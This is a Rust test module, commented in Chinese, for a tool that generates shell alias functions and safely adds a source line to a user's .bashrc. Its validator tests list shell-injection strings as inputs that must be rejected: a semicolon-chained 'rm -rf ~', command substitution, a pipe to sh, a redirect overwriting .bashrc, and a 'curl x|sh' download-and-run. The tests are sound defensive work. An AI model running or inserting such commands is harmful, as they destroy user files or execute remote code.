use super::*;

/// 「这份文本里**有整整一行**逐字等于它」。
///
/// ⚠ 刻意不是 `hay.contains(needle)`：那种比法的**匹配单位（子串）比事实（一整行）小**
/// —— 别名那一行被截断、或被加了个没人要的修饰，子串比法照样绿。
/// `needle_anchor_registry` 里那条递减棘轮数的正是这一族，本模块一处都不往上加。
fn pinned(hay: &str, needle: &str) -> bool {
    hay.lines().any(|l| l == needle)
}

/// panic 也要清干净（`profile_installer` 那条纪律的同一份）。
struct TmpHome(PathBuf);
impl Drop for TmpHome {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}
fn tmp_home(tag: &str) -> TmpHome {
    let d = std::env::temp_dir().join(format!(
        "ccm-alias-{tag}-{}-{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|x| x.as_nanos())
            .unwrap_or(0)
    ));
    std::fs::create_dir_all(&d).expect("建 tempdir");
    TmpHome(d)
}

/// ★★ 围栏：**放进用户 shell 会被执行的那一行，一个命令分隔符都不许有**。
///
/// 正例那一半不是凑数：围栏收太紧会把 `buildAliasLine` 真正产出的形状挡在外面
/// （六个修饰 + 带空格的模型名那种要引号的值），那是把一个洞换成一个回归。
#[test]
fn the_alias_fence_only_lets_the_generated_shape_through() {
    for ok in [
        "zcc() { ccm --account 'z' \"$@\"; }",
        "bcc() { ccm \"$@\"; }",
        "zcct() { ccm --tmux --account 'z' --agent codex --model 'opus' \"$@\"; }",
        "basecc() { ccm --base --launcher '/usr/bin/claude' \"$@\"; }",
        "m() { ccm --model 'claude-opus-4-1' \"$@\"; }",
        // `q()` 对含引号的值产出的那一形 —— 反斜杠唯一合法的出场
        "q1() { ccm --model 'a'\\''b' \"$@\"; }",
    ] {
        assert!(
            validate_alias_line(ok).is_ok(),
            "围栏拒了一个 `buildAliasLine` 真会产出的形状：{ok:?} —— \
                 收太紧会让用户在界面上点了「写入」却永远写不成"
        );
    }
    for bad in [
        // 注入：分号起第二条命令
        "zcc() { ccm --account 'z'; rm -rf ~ \"$@\"; }",
        // 注入：命令替换
        "zcc() { ccm --account $(id -u) \"$@\"; }",
        "zcc() { ccm --account `id -u` \"$@\"; }",
        // 注入：后台 / 管道 / 重定向
        "zcc() { ccm --account z & \"$@\"; }",
        "zcc() { ccm --account z | sh \"$@\"; }",
        "zcc() { ccm --account z > ~/.bashrc \"$@\"; }",
        // 换行：整条第二行都是自由的
        "zcc() { ccm\nrm -rf ~ \"$@\"; }",
        // 名字非法：带空格粘进 rc 会当场弄坏 shell 配置（Phase D 审计逼出来的那条）
        "my alias() { ccm \"$@\"; }",
        "2cc() { ccm \"$@\"; }",
        // 修饰不在闭集里
        "zcc() { ccm --dangerously-skip-permissions \"$@\"; }",
        // 形状：不转发 "$@"
        "zcc() { ccm --account 'z'; }",
        // 引号不配平
        "zcc() { ccm --model 'op \"$@\"; }",
        // 干脆不是我们生成的东西
        "rm -rf ~",
        "",
    ] {
        assert!(
            validate_alias_line(bad).is_err(),
            "围栏放行了 {bad:?} —— 这一行会被写进一份用户 shell 会 source 的文件"
        );
    }
}

/// ★★ **整份重写**：删了账号，它那条命令当场没了。
///
/// 这一条买的正是「为什么不往 `~/.bashrc` 追加」——追加那条路上，
/// 下面第二次调用只会让文件里**同时**有 `zcc` 和 `bcc`。
#[test]
fn regenerating_drops_the_account_you_deleted() {
    let h = tmp_home("regen");
    let two = vec![
        "zcc() { ccm --account 'z' \"$@\"; }".to_string(),
        "bcc() { ccm --account 'b' \"$@\"; }".to_string(),
    ];
    let r = apply(&h.0, &two, None, false).expect("第一次生成");
    assert!(r.wrote_alias_file, "第一次必须真写：{r:?}");
    let p = alias_file_in(&h.0);
    let after = std::fs::read_to_string(&p).expect("读回生成文件");
    // ⚠ 比的是**整行相等**，而且拿的是喂进去的那一行本身 ——
    //   `contains("zcc()")` 这种子串比法的匹配单位比事实小：那一行被截断 / 被改了修饰，
    //   它照样绿（`needle_anchor_registry` 那条递减棘轮数的正是这一族）。
    assert!(
        pinned(&after, &two[0]) && pinned(&after, &two[1]),
        "{after}"
    );

    // 删掉 b 这个账号之后再生成一次
    let one = vec!["zcc() { ccm --account 'z' \"$@\"; }".to_string()];
    apply(&h.0, &one, None, false).expect("第二次生成");
    let after = std::fs::read_to_string(&p).expect("读回生成文件");
    assert!(pinned(&after, &one[0]), "留下来的那条没了：{after}");
    assert!(
        !pinned(&after, &two[1]),
        "★ 删了账号，它那条命令还在 —— 那正是「往 rc 里追加」这条路的病：{after}"
    );
}

/// 内容一致 ⇒ **一个字节都不写**（不是「写了一遍一样的」）。
#[test]
fn identical_content_is_not_rewritten() {
    let h = tmp_home("idem");
    let lines = vec!["zcc() { ccm --account 'z' \"$@\"; }".to_string()];
    assert!(apply(&h.0, &lines, None, false).unwrap().wrote_alias_file);
    let r = apply(&h.0, &lines, None, false).unwrap();
    assert!(
        !r.wrote_alias_file && r.alias_file_unchanged,
        "第二次不该再写：{r:?}"
    );
}

/// 预览**一个字节都不写** —— 「看一眼会发生什么」不该有副作用。
#[test]
fn dry_run_touches_nothing() {
    let h = tmp_home("dry");
    let lines = vec!["zcc() { ccm --account 'z' \"$@\"; }".to_string()];
    let r = apply(&h.0, &lines, None, true).expect("预览");
    assert_eq!(r.names, vec!["zcc".to_string()]);
    assert!(!r.wrote_alias_file);
    assert!(
        !alias_file_in(&h.0).exists(),
        "预览把文件写出来了 —— 那它就不是预览"
    );
}

/// 一条不合法 ⇒ **整批不写**。半份别名文件比没有更坏。
#[test]
fn one_bad_line_aborts_the_whole_batch() {
    let h = tmp_home("batch");
    let lines = vec![
        "zcc() { ccm --account 'z' \"$@\"; }".to_string(),
        "evil() { ccm --account 'z'; curl x|sh \"$@\"; }".to_string(),
    ];
    assert!(apply(&h.0, &lines, None, false).is_err());
    assert!(
        !alias_file_in(&h.0).exists(),
        "整批该被拒，可文件已经建出来了"
    );
}

/// 同名两条 ⇒ 拒。后一条会静默盖掉前一条，而用户只会看见「少了一个命令」。
#[test]
fn duplicate_names_are_refused() {
    let h = tmp_home("dup");
    let lines = vec![
        "zcc() { ccm --account 'z' \"$@\"; }".to_string(),
        "zcc() { ccm --account 'b' \"$@\"; }".to_string(),
    ];
    assert!(apply(&h.0, &lines, None, false).is_err());
}

/// ★★ rc 那一行：**加一次，第二次一个字节都不写**，而且用户自己的内容一行不动。
#[test]
fn the_rc_source_line_is_added_once_and_keeps_user_content() {
    let h = tmp_home("rc");
    let rc = h.0.join(".bashrc");
    std::fs::write(&rc, "export PATH=$PATH:/opt/bin\nalias ll='ls -l'\n").expect("写 rc");
    let lines = vec!["zcc() { ccm --account 'z' \"$@\"; }".to_string()];
    let line = source_line(&alias_file_in(&h.0));

    let added = ensure_rc_source_line(&h.0, &rc.display().to_string(), &line).expect("第一次装");
    assert!(added, "第一次该真写");
    let after = std::fs::read_to_string(&rc).expect("读回");
    assert!(
        pinned(&after, "alias ll='ls -l'"),
        "用户内容被动了：{after}"
    );
    assert!(after.contains(&line), "那一行没进去：{after}");
    assert!(
        after.contains(RC_BEGIN) && after.contains(RC_END),
        "{after}"
    );

    let again = ensure_rc_source_line(&h.0, &rc.display().to_string(), &line).expect("第二次");
    assert!(!again, "★ 第二次又写了一遍 —— 那正是「重复追加」那条病");
    let twice = std::fs::read_to_string(&rc).expect("读回");
    assert_eq!(twice.matches(&line).count(), 1, "那一行出现了两次：{twice}");

    // 顺带：候选表能认出「已经 source 过了」
    let r = apply(&h.0, &lines, None, true).expect("预览");
    let me = r
        .rc_candidates
        .iter()
        .find(|c| c.path == rc.display().to_string())
        .expect("候选里该有 .bashrc");
    assert!(me.sourced, "装完了还说没 source 过：{me:?}");
}

/// 🔴 **装了 ccm 别名块的人，不许再被追加一行。**
///
/// `src/shared/ccm-aliases.sh` 里那一行写的是 `$HOME/.cc-monitor/…`（**没展开**），
/// 而 [`source_line`] 手上是展开后的绝对路径。按整行比，这个人会被判成
/// 「还没 source 过」，于是又被追加一行 —— **那正是本件开头列的第一条病**。
/// 本条把那个形状原样喂进去。
#[test]
fn an_rc_that_already_sources_it_via_home_var_is_recognized() {
    let h = tmp_home("homevar");
    let rc = h.0.join(".bashrc");
    // 逐字取自 `src/shared/ccm-aliases.sh` 的最后一行（`$HOME` 没展开）。
    let ccm_block = "if [ -r \"$HOME/.cc-monitor/account-aliases.sh\" ]; then . \"$HOME/.cc-monitor/account-aliases.sh\"; fi\n";
    std::fs::write(&rc, format!("# mine\n{ccm_block}")).expect("写 rc");
    let before = std::fs::read(&rc).expect("读原文");

    let line = source_line(&alias_file_in(&h.0));
    let added = ensure_rc_source_line(&h.0, &rc.display().to_string(), &line).expect("不该报错");
    assert!(
        !added,
        "★ 已经 source 过了还要再加一行 —— 那正是「重复追加」那条病"
    );
    assert_eq!(std::fs::read(&rc).expect("读回"), before, "rc 必须逐字未变");

    // 候选表也要认得出来（界面上那一项会显「已经 source 过了」）。
    let me = rc_candidates_in(&h.0)
        .into_iter()
        .find(|c| c.path == rc.display().to_string())
        .expect("候选里该有 .bashrc");
    assert!(me.sourced, "候选表没认出 `$HOME` 那一形：{me:?}");
}

/// 那一行在文件不存在时**必须返回 0** —— 它是 `ccm-aliases.sh` 的最后一行。
#[test]
fn the_source_line_is_a_no_op_when_the_file_is_absent() {
    let line = source_line(Path::new("/nowhere/account-aliases.sh"));
    assert!(
        line.starts_with("if ") && line.ends_with("; fi"),
        "写成了 `&&` 那一形 ⇒ 文件不存在时整行返回 1，而它是那份片段的最后一行：{line}"
    );
    assert!(
        line.contains(ALIAS_FILE_REL.rsplit('/').next().unwrap()),
        "{line}"
    );
}

/// 围栏损坏（有 BEGIN 没 END）⇒ **中止**，文件逐字未变。
///
/// 这条与 `profile_installer::damaged_fence_leaves_the_file_byte_identical` 同形：
/// 用后面那个 END 去配对，会把中间的用户代码整段吃掉。
#[test]
fn a_damaged_fence_leaves_the_rc_byte_identical() {
    let h = tmp_home("bad");
    let rc = h.0.join(".bashrc");
    let original = format!("# mine\n{RC_BEGIN}\nalias ll='ls -l'\n");
    std::fs::write(&rc, &original).expect("写 rc");
    let before = std::fs::read(&rc).expect("读原文");
    let line = source_line(&alias_file_in(&h.0));
    let e =
        ensure_rc_source_line(&h.0, &rc.display().to_string(), &line).expect_err("围栏损坏该中止");
    assert!(e.contains("找不到配对的 END"), "理由要说得清：{e}");
    assert_eq!(
        std::fs::read(&rc).expect("读回"),
        before,
        "围栏损坏时文件必须逐字未变"
    );
}

/// rc 路径过 home 围栏 —— 跑出 home 的一律拒（复用 `profile_installer` 那道，不另立一份）。
///
/// ⚠ 正例那一半不是凑数：围栏若收成「谁都不许」，上面那条「装一行 source」会当场变成
/// 一个永远写不成的按钮，而本条**只看反例时读起来一样绿**。
#[test]
fn the_rc_path_cannot_escape_home() {
    let h = tmp_home("fence");
    for bad in ["/etc/profile", "/tmp/x.rc", ".bashrc"] {
        let e = ensure_rc_source_line(&h.0, bad, "# x").expect_err("该被围栏拒");
        assert!(e.starts_with("refuse profile path"), "{bad}：{e}");
    }
    // 正例：home 之内那一份真的过得去（文件不存在 ⇒ 停在「读不到」，而不是停在围栏上）。
    let e = ensure_rc_source_line(&h.0, &h.0.join(".zshrc").display().to_string(), "# x")
        .expect_err("文件还不存在，这一步该停在读那一步");
    assert!(
        !e.starts_with("refuse profile path"),
        "围栏把 home 之内的路径也拒了 —— 那会让那个按钮永远写不成：{e}"
    );
}

/// 🔴 `§0c 问三`：`cc` 在多数机器上是 C 编译器 —— 撞了要**出声**。
///
/// ⚠ 这一条断的是「自带别名块里那几个名字会被认出来」，人群取自
/// `sftp::CCM_WRAPPER_SNIPPET`（= `src/shared/ccm-aliases.sh` 本身），**不抄第二份名单** ——
/// `KR58D1` 起这句话**真的兑现了**：人群由 `sftp::builtin_alias_names()` 现算，
/// 上一版这里手写着 `["cc", "cch", "cct"]`，那就是第二个住址。
#[test]
fn a_name_that_is_already_taken_gets_a_note() {
    let taken = crate::sftp::builtin_alias_names();
    assert!(
        !taken.is_empty(),
        "自带别名块里一个函数都没解析出来 —— 这一条会变成空真，先修人群"
    );
    for t in &taken {
        let note =
            collision_note(t).unwrap_or_else(|| panic!("`{t}` 在自带别名块里就有，却一声不吭"));
        assert!(note.contains(t), "{note}");
    }
    assert!(
        collision_note("zzz_no_such_command_anywhere").is_none(),
        "没撞的名字不该报警 —— 一句假警报会让人把所有警报都当噪音"
    );
}

/// 🔴 `KR58D1` 的**正面**：`cch` 从自带块里删掉之后，它变成**用户可以自己用的名字**。
///
/// 〔用@09-11 逐字〕「`cch` = 不让它猜目录，就在你当前这个目录起。**这个不要。删掉。**」
/// `K37` 第一条的判据：把 `cch` 去掉，用户自己写一行就有了 ⇒ **偏好，该出去**。
///
/// ⚠ **这不是回归，是多一格自由** —— 所以这里断的是「不再报『自带块里已经有』」，
/// 而**不是**「`collision_note` 返回 `None`」：`PATH` 上真有个叫 `cch` 的程序时它**该**出声，
/// 那条支路一个字都没动（断成 `is_none()` 会让这条判据在那种机器上假红）。
///
/// **失效方向**（DoD 逐字）：只删了 sh 文件那两行、而别处还把它当「已被占用」
/// ⇒ 用户仍然用不了这个名字。
#[test]
fn cch_is_gone_and_the_name_is_free_for_the_user() {
    assert!(
        !crate::sftp::builtin_alias_names().contains(&"cch"),
        "`cch` 还定义在 src/shared/ccm-aliases.sh 里 —— 用户逐字说的是「这个不要。删掉。」"
    );
    if let Some(note) = collision_note("cch") {
        assert!(
            !note.contains("ccm-aliases.sh"),
            "`cch` 已经不在自带别名块里了，却仍被报成「自带块占了」：{note}"
        );
    }
}

/// 生成文件里**没有时间戳** —— 有了就永远比不出「内容没变」。
#[test]
fn the_generated_file_is_byte_stable() {
    let lines = vec!["zcc() { ccm --account 'z' \"$@\"; }".to_string()];
    assert_eq!(render_file(&lines), render_file(&lines));
    assert!(render_file(&[]).contains("一条别名都没有"));
}

// ═══════════════════════════════════════════════════════════════════════
// 〔AL1 · 2026-09-24〕`设计/71`：一类别名 · 两跳（渲染纯 / 写入唯一副作用）· 读回口
// ═══════════════════════════════════════════════════════════════════════

fn al(name: &str, args: &[&str]) -> Alias {
    Alias {
        name: name.to_string(),
        args: args.iter().map(|s| s.to_string()).collect(),
    }
}

/// 黄金串：同一份清单渲染出的每一行逐字钉住（`71 §12.9` W4）。
#[test]
fn rendering_is_byte_stable_and_quotes_only_what_needs_it() {
    let r = render(&[
        al("zcc", &["--account", "z"]),
        al(
            "convz",
            &["--tmux", "--account", "z", "--cwd", "/home/u/文档/c c"],
        ),
        al("mo", &["--model", "it's", "--", "--verbose"]),
    ]);
    assert!(r.problems.is_empty(), "{:?}", r.problems);
    assert_eq!(
        r.lines,
        vec![
            r#"zcc() { ccm --account z "$@"; }"#.to_string(),
            r#"convz() { ccm --tmux --account z --cwd '/home/u/文档/c c' "$@"; }"#.to_string(),
            r#"mo() { ccm --model 'it'\''s' -- --verbose "$@"; }"#.to_string(),
        ]
    );
    for l in &r.lines {
        assert!(pinned(&r.code, l), "整份代码里缺这一行：{l}");
    }
    assert_eq!(
        render(&[al("zcc", &["--account", "z"])]).code,
        render(&[al("zcc", &["--account", "z"])]).code
    );
}

/// 🔴 **异源判据**：让真的 bash 去执行渲染出来的那一行 —— 调用时再给的参数接在预置参数后面，
/// 值里的空格 / 单引号 / 中文原样到达 `ccm`（用一个假 `ccm` 函数把收到的 argv 一行一个吐出来）。
#[test]
fn a_rendered_alias_really_appends_the_callers_args_in_bash() {
    let a = al(
        "convz",
        &["--tmux", "--cwd", "/tmp/a b/文档", "--model", "it's"],
    );
    let line = render_line(&a);
    let script = format!("ccm() {{ printf '%s\\n' \"$@\"; }}\n{line}\nconvz --cwd /elsewhere\n");
    let out = std::process::Command::new("bash")
        .arg("-c")
        .arg(&script)
        .output()
        .expect("起 bash");
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let got: Vec<String> = String::from_utf8_lossy(&out.stdout)
        .lines()
        .map(str::to_string)
        .collect();
    let mut want = a.args.clone();
    want.extend(["--cwd".to_string(), "/elsewhere".to_string()]);
    assert_eq!(got, want, "bash 真执行下来的 argv 与清单对不上");
}

/// 写进去的就是预览的那一份；读回来的清单与写进去的**两向相等**。
#[test]
fn what_is_installed_reads_back_as_the_same_list() {
    let h = tmp_home("roundtrip");
    let list = vec![
        al("zcc", &["--account", "z"]),
        al("zcct", &["--tmux", "--account", "z"]),
        al(
            "mine",
            &["--cwd", "/x y", "--agent", "codex", "--", "--foo"],
        ),
    ];
    let rep = install_in(&h.0, &list, None).expect("写");
    assert!(rep.wrote_alias_file);
    let on_disk = std::fs::read_to_string(alias_file_in(&h.0)).unwrap();
    assert_eq!(on_disk, render(&list).code, "落盘的不是预览的那一份");
    let back = read_in(&h.0).expect("读回");
    assert!(
        back.exists && back.unparsed.is_empty(),
        "{:?}",
        back.unparsed
    );
    assert_eq!(back.aliases, list);
    // 再写一次同一份 ⇒ 一个字节都不写。
    assert!(!install_in(&h.0, &list, None).unwrap().wrote_alias_file);
}

/// 读回口认得盘上那份**旧的**（v1 头、值带引号、从前 `"${CCM:-…}"` 那种调用词），
/// 认不出的行**不静默丢**：原文 ＋ 原因。
#[test]
fn the_reader_takes_the_old_file_and_names_what_it_cannot_parse() {
    let h = tmp_home("old");
    let p = alias_file_in(&h.0);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(
        &p,
        "# === cc-monitor account aliases BEGIN v1 ===\n\
         # 注释\n\
         zcc() { ccm --account 'z' \"$@\"; }\n\
         bcct() { \"${CCM:-/h/.cc-monitor/bin/ccm}\" --tmux --account 'b' \"$@\"; }\n\
         alias x=ls\n\
         bad() { ccm --print \"$@\"; }\n\
         # === cc-monitor account aliases END ===\n",
    )
    .unwrap();
    let back = read_in(&h.0).unwrap();
    assert_eq!(
        back.aliases,
        vec![
            al("zcc", &["--account", "z"]),
            al("bcct", &["--tmux", "--account", "b"])
        ]
    );
    assert_eq!(back.unparsed.len(), 2, "{:?}", back.unparsed);
    assert!(
        back.unparsed[0].starts_with("alias x=ls（"),
        "{:?}",
        back.unparsed
    );
    assert!(back.unparsed[1].contains("--print"), "{:?}", back.unparsed);
    // 文件不在 ≠ 读失败。
    let empty = tmp_home("none");
    let l = read_in(&empty.0).unwrap();
    assert!(!l.exists && l.aliases.is_empty());
}

/// V1–V5（`71 §5`）：每一条规则各有一个会被拦下的例子；有一条不合格 ⇒ **整批不写**。
#[test]
fn every_combination_rule_stops_a_bad_alias_and_nothing_is_written() {
    let bad = [
        al("1x", &[]),
        al("a", &["--account", "z", "--base"]),
        al("b", &["--tmux=w", "--tmux-base", "w"]),
        al("c", &["--tmux", "--bus-register"]),
        al("d", &["--detach"]),
        al("e", &["--tmux-size", "80x24"]),
        al("f", &["--print"]),
        al("g", &["resume", "abc"]),
        al("h", &["--account"]),
        al("i", &["--cwd", "a\nb"]),
    ];
    for a in &bad {
        assert!(check_alias(a).is_err(), "该拦没拦：{a:?}");
    }
    let good = [
        al(
            "ok1",
            &["--tmux", "--detach", "--bus-register", "--bus-note", "x"],
        ),
        al("ok2", &["--tmux=w", "--tmux-size", "80x24"]),
        al("ok3", &["--base", "--agent", "codex"]),
    ];
    for a in &good {
        assert_eq!(check_alias(a), Ok(()), "{a:?}");
    }
    let h = tmp_home("bad");
    let mut list = good.to_vec();
    list.push(bad[1].clone());
    let e = install_in(&h.0, &list, None).unwrap_err();
    assert!(e.contains("一条都没写"), "{e}");
    assert!(!alias_file_in(&h.0).exists(), "有一条不合格却写了");
    // 重名也是一条问题。
    let r = render(&[al("z", &[]), al("z", &["--tmux"])]);
    assert_eq!(r.problems.len(), 1);
}

/// 🔴 **异源**：别名里能放的每个旗标，都得是后端 `ccm --help` 里真有的那个词
/// （用法文本住后端 `control/ccm/mod.rs::USAGE`，两棵树不共享源码 ⇒ 读它的原文）。
/// 反向：用法里那几个「每次取值都不同」的（第三档）不许混进来。
#[test]
fn every_alias_flag_is_a_real_ccm_flag() {
    let usage_src = std::fs::read_to_string(
        crate::guard_support::repo_root().join("src/backend/control/ccm/mod.rs"),
    )
    .expect("读后端 ccm 用法");
    let from = guard_core::find_pinned(&usage_src, "选项\n").expect("用法里「选项」那一段锚不住");
    let usage = &usage_src[from..];
    for (flag, _) in ALIAS_FLAGS {
        assert!(
            usage.contains(&format!("  {flag} ")) || usage.contains(&format!("  {flag}[")),
            "`{flag}` 不是后端 ccm 用法里的一个旗标 —— 生成出来就是一条当场报错的别名"
        );
    }
    for third in [
        "--resume",
        "--ccm-sid",
        "--print",
        "--ccm-probe",
        "--version",
        "--help",
    ] {
        assert!(
            ALIAS_FLAGS.iter().all(|(f, _)| f != &third),
            "`{third}` 每次取值都不同，做成固定别名没意义（`71 §4` 第三档）"
        );
    }
}
